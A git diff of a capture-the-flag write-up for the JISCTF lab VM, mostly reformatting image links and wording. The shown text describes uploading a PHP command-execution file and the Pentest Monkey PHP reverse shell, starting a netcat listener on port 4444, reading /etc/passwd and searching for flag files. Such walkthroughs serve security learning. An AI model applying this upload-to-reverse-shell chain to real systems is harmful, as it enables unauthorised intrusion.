@@ -141,20 +141,21 @@ The "robots.txt" has some promising entries, will keep this in mind for now!
 ## Login Into Web App
 
 I was able to login using the creds I found eariler on the `http://10.0.0.131/login.php`
-(/JISCTF/_resources/18d8cdf37c994da0ad1d0b5c3912ed0c.png)
+![Optional Text](/JISCTF/_resources/18d8cdf37c994da0ad1d0b5c3912ed0c.png)
 Once Logged in, it looks like a file a file upload
-(/JISCTF/_resources/ac747f1f4a954b45bee37746ea9aec2f.png)
+![Optional Text](/JISCTF/_resources/ac747f1f4a954b45bee37746ea9aec2f.png)
 I uploaded a File, and it **returned "Success" in the top left** to confirm we we use uploaded_files, this was found in the robots.txt earlier
 
 **Succes!** **I was able to upload an image!**
-(/JISCTF/_resources/2cbc58cd826445df90befc40c4cbd989.png)
 
-Next I will try to get command execution
+![Optional Text](/JISCTF/_resources/2cbc58cd826445df90befc40c4cbd989.png)
+
+Next I want to try command execution
 
 ## Command Execution
 
 After failing a few times the code snippet below worked
-(/JISCTF/_resources/ef8e2ba4c08d4607bfe582b3e6ee5c29.png)**
+![Optional Text](/JISCTF/_resources/ef8e2ba4c08d4607bfe582b3e6ee5c29.png)**
 Resource to code snippet `https://www.w3resource.com/php-exercises/php-basic-exercise-17.php`
 
 1.  First, save the code to a php file in my case **sat.php**
@@ -164,13 +165,13 @@ Resource to code snippet `https://www.w3resource.com/php-exercises/php-basic-exe
 **Success!!!**
 ![Optional Text](/JISCTF/_resources/813c0e3cf9864a7a8476a171355cc79c.png)
 
-Next I want to upload a Reverse Shell!
+Now I want to upload a Reverse Shell!
 
-Reverse Shell
+### Reverse Shell
 
-To save time here I will use the good old "**Pentest Monkey Reverse Shell**". I tested several others that worked, but was not unable to get a python shell.
+To save time I will use the good old "**Pentest Monkey Reverse Shell**". I tested several others that worked, but was not unable to get a python shell.
 
-Rember to change the IP and port to your machine and whatever port you are listening on.
+***Rember to change the IP and port to your machine and whatever port you are listening on.***
 
 ```
 <?php
@@ -364,9 +365,9 @@ function printit ($string) {
 ?>
 ```
 
-1.  Once again I save the file in my case **got.php**
+1.  Once again, I save the file in my case **got.php**
 2.  Start my netcat listener `nc -nvlp 4444`
-    ![Optional Text](/JISCTF/_resources/ed527a7a9d594eca8aeb7bb8c05defc4.png)
+![Optional Text](/JISCTF/_resources/ed527a7a9d594eca8aeb7bb8c05defc4.png)
 3.  Uploaded the file thru the file upload page
 4.  Go to IPofVM/uploaded_files/got.php
 
@@ -375,9 +376,9 @@ function printit ($string) {
 
 * * *
 
-## In our Shell
+## In the Shell 
 
-I cat the /etc/passwd
+I `cat` the `/etc/passwd`
 
 ```
 cat /etc/passwd
@@ -414,7 +415,7 @@ technawi:x:1000:1000:technawi,,,:/home/technawi:/bin/bash
 mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-I can see the **technawi** user in the /etc/passwd. But After some digging I had no luck. I decided to search for flags by literally searching for flag,flags,.etc.
+I see the **technawi** user in the /etc/passwd output. But After some digging I had no luck. I decided to search for flags. By literally searching for flag, flags,..etc.
 
 After many attempts, I was finally lucky with `find . -name flag | grep -v 'Permission'` Keep in mind, giving our limted shell it only prints the relevant files at the end. `/var/www/html/flag`
 
@@ -427,6 +428,7 @@ Thinking this was the **flag** we saw eariler I ls -alt the dir.
 I notice a "flag" file, flag directory, and a hint!
 
 No luck on flag.txt
+
 ![Optional Text](/JISCTF/_resources/925f4d4afc97472c916f01968baf5bf1.png)
 
 but on the hint......
